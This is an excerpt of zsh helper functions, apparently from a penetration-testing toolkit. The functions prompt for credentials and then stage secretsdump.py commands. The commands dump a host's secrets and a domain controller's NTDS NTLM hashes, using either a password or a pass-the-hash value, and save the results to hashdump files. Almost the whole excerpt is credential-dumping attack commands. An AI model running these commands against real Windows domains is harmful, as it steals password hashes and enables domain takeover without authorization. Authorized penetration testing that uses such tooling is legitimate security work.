...
nb-ad-dump-secrets() {
    ...
    if [[ $login == "p" ]]; then
        ...
        nb-vars-set-pass
        print -z "secretsdump.py ${__DOMAIN}/${__USER}:'${__PASS}'@${__RHOST} | tee ${__hostpath}/${__USER}-hashdump.txt"
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter THE WHOLE NT:LM hash for authentication"
        __check-hash
        print -z "secretsdump.py ${__USER}@${__RHOST} -hashes '${__HASH}' | tee ${__hostpath}/${__USER}-hashdump.txt"
    else
        echo
...
nb-ad-dump-ntds() {
    ...
    if [[ $login == "p" ]]; then
        ...
        nb-vars-set-pass
        print -z "secretsdump.py ${__DOMAIN}/${__USER}:'${__PASS}'@${__DCHOST} -just-dc-ntlm | tee $(__dcpath)/NTDS-hashdump.txt"
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the domain admin NTLM hash for authentication"
        nb-vars-set-pass
        print -z "secretsdump.py ${__USER}@${__DCHOST} -hashes '${__HASH}' -just-dc-ntlm | tee $(__dcpath)/NTDS-hashdump.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
